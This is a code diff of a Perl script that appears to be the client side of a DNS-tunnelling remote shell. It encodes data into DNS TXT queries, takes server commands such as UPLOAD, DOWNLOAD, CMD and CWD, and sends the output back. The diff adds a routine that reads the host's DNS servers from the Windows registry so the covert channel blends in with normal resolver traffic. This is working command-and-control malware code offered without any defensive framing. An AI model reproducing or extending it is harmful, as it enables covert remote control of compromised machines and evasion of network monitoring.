@@ -15,6 +15,7 @@ use IO::CaptureOutput qw(capture qxx);
 my $domain;
 my $debug;
 my $client_id = int(rand(65535));
+my @nameservers;
 #my $client_id = 100;
 
 ###############################
@@ -36,6 +37,26 @@ if ($debug) {
 ###############################
 # Subroutines
 ###############################
+sub getNameServers {
+	use Win32::Registry;
+	#my $dns_via_dhcp;
+	$::HKEY_LOCAL_MACHINE->Open("SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters", my $key) or debug("READ DHCP DNS ERROR", $!);
+	my ($type, $value);
+    $key->QueryValueEx("DHCPNameServer", $type, $value);
+	debug("DHCP DNS SERVERS", $value);
+	my @serverList = split(/\s/, $value);
+	foreach(@serverList) {
+		push(@nameservers, $_);
+	}
+    $key->QueryValueEx("NameServer", $type, $value);
+	debug("Static DNS SERVERS", $value);	
+	@serverList = split(/\s/, $value);
+		foreach(@serverList) {
+		push(@nameservers, $_);
+	}
+	$key->Close();
+}
+
 sub roundup {
 	my $n = shift;
 	return(($n == int($n)) ? $n : int($n+1));
@@ -59,11 +80,9 @@ sub sendQuery{
 	}	
 	my $msg_encoded = MIME::Base32::encode($msg);
 
-	debug("CLIENT_ID", $client_id);
 	my $client_id_encoded = MIME::Base32::encode($client_id);
-	debug("CLIENT_ID_ENCODED", $client_id_encoded);
-	debug("MSG_ENCODED LENGTH", length($msg_encoded));
-	
+	debug("CLIENT_ID_ENCODED", "$client_id_encoded($client_id)");
+	debug("MSG_ENCODED LENGTH", length($msg_encoded));	
 	
 	my $parts = roundup(length($msg_encoded) / 63);
 	debug("NUM OF PARTS", $parts);
@@ -77,8 +96,13 @@ sub sendQuery{
 		if ($debug) {
 			print "QUERY: $query (" . length($query) . ")\n";
 		}
-		#my $res = Net::DNS::Resolver->new(nameservers => [qw(192.168.0.48)]);
-		my $res = Net::DNS::Resolver->new(nameservers=> [qw(75.75.76.76)]);
+		my $nameserverref = \@nameservers;
+		my $res = Net::DNS::Resolver->new(        
+			nameservers => \@nameservers,	
+			timeout => 120,
+			recurse => 1,
+			#debug   => 1,
+		);
 		my $answer = $res->query($query, 'TXT');
 		if($answer) {
 			foreach my $rr ($answer->answer) {
@@ -96,14 +120,15 @@ sub shell{
 		my $client_cmd = "NULL";
 		my $sleep_value = 60;
         while(1) {
+				getNameServers();
 				debug("EXEC_RSP", $exec_rsp);
 				debug("CLIENT_CMD", $client_cmd);
 				my $response = sendQuery($exec_rsp, $client_cmd);
 				my @args = split(/\./, $response);
 				my $cmd = $args[0];
-				debug("CMD", $cmd);
+				debug("SERVER_CMD", $cmd);
 				my $payload = MIME::Base32::decode($args[1]);
-				debug("PAYLOAD", $payload);
+				debug("SERVER_PAYLOAD", $payload);
 				if ($cmd eq "UPLOAD") {
 					debug("CMD", $cmd);
 				} elsif ($cmd eq "DOWNLOAD") {
@@ -130,7 +155,6 @@ sub shell{
 						$client_cmd = "CMD";
 					}
 				} elsif($cmd eq "CWD") {
-					#if(chdir "$payload") {
 					if(chdir $payload) {
 						$exec_rsp = "COMMAND EXITED WITH: SUCCESS\n";
 					} else {
@@ -138,7 +162,7 @@ sub shell{
 					}
 					$client_cmd = "CWD";
 				} elsif ($cmd eq "NULL") {
-					debug("CMD", $cmd);
+					# debug("CMD", $cmd);
 					$exec_rsp = "NULL";
 					$client_cmd = "NULL";
 				} else {
